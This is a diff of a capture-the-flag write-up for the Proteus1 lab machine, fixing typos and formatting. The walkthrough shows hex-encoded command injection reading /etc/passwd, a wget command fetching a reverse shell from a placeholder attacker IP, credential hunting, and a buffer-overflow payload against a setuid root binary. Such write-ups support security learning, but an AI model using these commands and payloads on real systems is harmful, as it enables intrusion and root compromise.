@@ -90,7 +90,7 @@ I had a version (4.7.0) that still had it.
 
 ## Arbitrary Command Injection
 
-It's easy to create hex encoded commands. I also created a quick script to help double check my works and possibly handle other use 
+It's easy to create hex encoded commands. I also created a quick script to help double check my work and possibly handle other use 
 cases (though be wary of my shaky script abilites). Let's check again to see everything working. Here is the payload with 
 'cat /etc/passwd'
 
@@ -99,8 +99,7 @@ cases (though be wary of my shaky script abilites). Let's check again to see eve
 Now we can try to put a reverse shell in. The current account doesn't have write access to the web directory, so I needed to put it 
 somewhere else. wget supports this with -O. `wget -O /tmp/simpleshell.py http://<IP ADDR>/simpleshell.py`
 Encode it, send it, and double check the file was recieved. You can always look at your own apache access.log to see if the GET was 
-successful, or you can 'ls' the /tmp directory. If you check the /tmp directory with permissions, you can see they were nice enough 
-to even grant our shell execute permissions. 
+successful, or you can 'ls' the /tmp directory. 
 
 ![already_exec_shell](https://github.com/jlreiter/Proteus1/blob/master/imgs/already_executable_shell.png)
 
@@ -111,7 +110,7 @@ So now all I have to do is throw up a listner and execute the shell.
 ## >_Terminal
 
 Once inside you can explore around to your heart's content. There are some config files with credentials and a test admin login that 
-can be used for the web page. There is even a RSA private key (password protected) (see some stuff in /imgs/interesting_snip\*)Keep 
+can be used for the web page. There is even a RSA private key (password protected) (see some stuff in /imgs/interesting_snip\*). Keep 
 exploring and you'll eventually find a quaint file: admin_login_logger. Check it's permissions and notice anything special? 
 The sticky bit is set and the owner is root. I nc it over to my machine for further testing. 
 
@@ -132,14 +131,14 @@ root with a certain space for a payload. A few things to note about the overflow
  - the user has limited space in the file name for the path and file
  - the pattern offset is 456 based on the name of the file created when I hit the first overflow 
  
-With these notes in mind, I can craft a payload. I fire up python interpreter for some quick work. 
-`def pad(len):`
-`    pad="A"*len`
-`    return pad`
-
-`def gen():`
-`    payload=userInput + pad(patternCustomLen-len(userInput)) + fileToOverwrite`
-`    print payload`
+With these notes in mind, I can craft a payload. I fire up python interpreter for some quick work.  
+`def pad(len):`  
+`    pad="A"*len`  
+`    return pad`  
+  
+`def gen():`  
+`    payload=userInput + pad(patternCustomLen-len(userInput)) + fileToOverwrite`  
+`    print payload`  
 
 I initially thought I could overwrite the /etc/passwd file and remove the root account password, but this is when I found that 
 the overflow just appends user input to the end. It also doesn't handle new lines very well either. Another easy thing to do is 
